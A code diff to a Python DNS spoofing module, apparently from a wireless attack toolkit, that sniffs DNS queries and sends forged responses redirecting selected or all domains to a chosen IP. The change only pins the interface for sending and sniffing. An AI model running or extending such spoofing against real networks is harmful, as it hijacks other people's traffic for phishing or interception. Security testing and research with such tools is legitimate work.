@@ -13,6 +13,7 @@ class DNSModule(BaseModule):
         self.is_spoofing = False
         self.target_address = None
         self.domain_spoof_list = None
+        self.interface = None  # Store interface name
         self.register_handler("spoof_selected", self.handle_spoof_selected)
         self.register_handler("spoof_all", self.handle_spoof_all)
         self.register_handler("stop", self.handle_stop)
@@ -21,6 +22,8 @@ class DNSModule(BaseModule):
         print(f"[{self.module_name}] DNS module initialized")
         if iface.ADAPTER_STATUS == "monitor":
             iface.set_adapter_status("managed")
+        # Get the current interface from your network adapter
+        self.interface = iface.ADAPTER_NAME
 
     def on_stop(self):
         if self.is_spoofing:
@@ -52,9 +55,9 @@ class DNSModule(BaseModule):
 
                     response = spoofed_ip / spoofed_udp / spoofed_dns
 
-                    # Send multiple times for reliability
+                    # Send on the specific interface
                     for _ in range(3):
-                        send(response, verbose=0, iface=iface.ADAPTER_NAME)
+                        send(response, verbose=0, iface=self.interface)
 
                     print(f"[{self.module_name}] Spoofed DNS query for {query_name} -> {self.target_address}")
         except Exception as e:
@@ -65,7 +68,8 @@ class DNSModule(BaseModule):
         self.domain_spoof_list = message.data.get("spoof_targets")
         self.is_spoofing = True
 
-        print(f"[{self.module_name}] Spoofing selected domains: {self.domain_spoof_list} -> {self.target_address}")
+        print(
+            f"[{self.module_name}] Spoofing selected domains: {self.domain_spoof_list} -> {self.target_address} on interface {self.interface}")
         spoof_thread = threading.Thread(target=self._spoof_selected, daemon=True)
         spoof_thread.start()
 
@@ -82,7 +86,8 @@ class DNSModule(BaseModule):
                     prn=handle_packet,
                     store=0,
                     stop_filter=lambda pkt: not self.is_spoofing,
-                    count=50  # Process in batches
+                    count=50,
+                    iface=self.interface  # Specify interface here
                 )
         except Exception as e:
             print(f"[{self.module_name}] Error in spoof selected: {e}")
@@ -91,7 +96,7 @@ class DNSModule(BaseModule):
         self.target_address = message.data.get("target_ip")
         self.is_spoofing = True
 
-        print(f"[{self.module_name}] Spoofing all DNS queries -> {self.target_address}")
+        print(f"[{self.module_name}] Spoofing all DNS queries -> {self.target_address} on interface {self.interface}")
         spoof_thread = threading.Thread(target=self._spoof_all, daemon=True)
         spoof_thread.start()
 
@@ -108,7 +113,8 @@ class DNSModule(BaseModule):
                     prn=handle_packet,
                     store=0,
                     stop_filter=lambda pkt: not self.is_spoofing,
-                    count=50
+                    count=50,
+                    iface=self.interface  # Specify interface here
                 )
         except Exception as e:
             print(f"[{self.module_name}] Error in spoof all: {e}")
@@ -119,7 +125,7 @@ class DNSModule(BaseModule):
 
     def stop_spoofing(self):
         self.is_spoofing = False
-        print(f"[{self.module_name}] DNS spoofing stopped.")
+        print(f"[{self.module_name}] DNS spoofing stopped on interface {self.interface}")
 
 
 # Global instance
